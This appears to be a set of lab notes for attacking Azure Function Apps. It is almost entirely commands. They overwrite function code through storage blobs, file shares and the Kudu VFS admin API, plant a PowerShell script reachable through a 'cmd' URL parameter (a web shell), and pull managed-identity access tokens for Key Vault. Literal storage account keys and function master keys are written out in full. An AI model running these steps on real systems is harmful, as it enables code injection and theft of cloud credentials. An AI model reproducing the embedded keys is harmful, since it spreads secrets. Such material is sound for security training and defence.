# Function App

## Bucket Overwr­ite Contai­ner

```sh
az functionapp list
az functionapp config appsettings list --name <app-name> --resource-group
az storage blob download --account-name 02fedb58functionapps1 --auth-mode login -c 02fedb58-function-apps-1 -n released-package.zip -f ./released-package.zip

# Add or modify existing script (cf. get_token.js) then zip all files and upload them again
az storage blob upload --account-name 02fedb58functionapps1 --auth-mode login -c 02fedb58-function-apps-1 -n released-package.zip -f ./released-package.zip --overwrite
```

## Bucket overwr­ite File Share

```sh
az functionapp list
az storage account list
az storage account keys list --account-name 02fedb58functionapps2

az storage share list --account-name 02fedb58functionapps2 --account-key "9ioqjwViV5IjplDTC60nHghfIaIrmBp09Ki8eWUZg0BzRAqc+LJaBRuGmWwt0fLHqleTmodJvZ4L+AStoMrHFQ=="
az storage file list --account-name 02fedb58functionapps2 --account-key "9ioqjwViV5IjplDTC60nHghfIaIrmBp09Ki8eWUZg0BzRAqc+LJaBRuGmWwt0fLHqleTmodJvZ4L+AStoMrHFQ==" --share-name 02fedb58-function-apps-lab-2-879b --path "site/wwwroot" -o table
az storage file download --account-name 02fedb58functionapps2 --account-key "9ioqjwViV5IjplDTC60nHghfIaIrmBp09Ki8eWUZg0BzRAqc+LJaBRuGmWwt0fLHqleTmodJvZ4L+AStoMrHFQ==" --share-name 02fedb58-function-apps-lab-2-879b --path "site/wwwroot/hello-world/index.js" --dest ./index.js

# Then after modifying the file (cf. get_token_fs.js)
az storage file upload --account-name 02fedb58functionapps2 --account-key "9ioqjwViV5IjplDTC60nHghfIaIrmBp09Ki8eWUZg0BzRAqc+LJaBRuGmWwt0fLHqleTmodJvZ4L+AStoMrHFQ==" --share-name 02fedb58-function-apps-lab-2-879b --path "site/wwwroot/hello-world/index.js" --source ./index.js

# Also adding a script to get an access token (get_access_token.ps1)
az storage file upload --account-name 02fedb58functionapps2 --account-key "9ioqjwViV5IjplDTC60nHghfIaIrmBp09Ki8eWUZg0BzRAqc+LJaBRuGmWwt0fLHqleTmodJvZ4L+AStoMrHFQ==" --share-name 02fedb58-function-apps-lab-2-879b --path "site/wwwroot/hello-world/get_access_token.ps1" --source ./get_access_token.ps1
```

Then from the cmd:

```sh
https://02fedb58-function-apps-lab-2.azurewebsites.net/api/hello-world?cmd=powershell+./hello-world/get_access_token.ps1
```

## Micros­oft.We­b/site­s/host­/listk­eys/ac­tion

```sh
az functionapp list
az functionapp keys list --resource-group function-apps-labs --name 02fedb58-function-apps-lab-3

# Look for script_href
az rest --method GET --url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/function-apps-labs/providers/Microsoft.Web/sites/02fedb58-function-apps-lab-3/functions?api-version=2024-04-01"

# Access
curl "<script-href>?code=<master-key>"
curl -v https://02fedb58-function-apps-lab-3.azurewebsites.net/admin/vfs/site/wwwroot/hello-world/index.js?code=oQabJcrWGsrtO9uED-7Cfd3dpF13kZc2hHzLKzMplVY0AzFuQ205gA==

# Then to modify it
curl -X PUT "https://02fedb58-function-apps-lab-3.azurewebsites.net/admin/vfs/site/wwwroot/hello-world/index.js?code=oQabJcrWGsrtO9uED-7Cfd3dpF13kZc2hHzLKzMplVY0AzFuQ205gA==" \
--data-binary @/workspace/index.js \
-H "Content-Type: application/json" \
-H "If-Match: *" \
-v

curl -X PUT "https://02fedb58-function-apps-lab-3.azurewebsites.net/admin/vfs/site/wwwroot/hello-world/get_access_token.ps1?code=oQabJcrWGsrtO9uED-7Cfd3dpF13kZc2hHzLKzMplVY0AzFuQ205gA==" \
--data-binary @/workspace/get_access_token.ps1 \
-H "Content-Type: application/json" \
-H "If-Match: *" \
-v
```

Then from the cmd:

```sh
https://02fedb58-function-apps-lab-2.azurewebsites.net/api/hello-world?cmd=powershell+./hello-world/get_access_token.ps1
```

## Micros­oft.We­b/site­s/publ­ishxml­/actio­n

```sh
az functionapp deployment list-publishing-profiles --resource-group function-apps-labs --name 02fedb58-function-apps-lab-4 --output json
```

Then access SCM from `http://02fedb58-function-apps-lab-4.scm.azurewebsites.net:443/BasicAuth` using creds previously obtained

Then request access token using the following commands:

```ps1
$resource = "https://vault.azure.net"
$url = "$($env:IDENTITY_ENDPOINT)?api-version=2019-08-01&resource=$resource"
Invoke-RestMethod -Uri $url -Method Get -Headers @{"X-IDENTITY-HEADER" = "$env:IDENTITY_HEADER"}
```
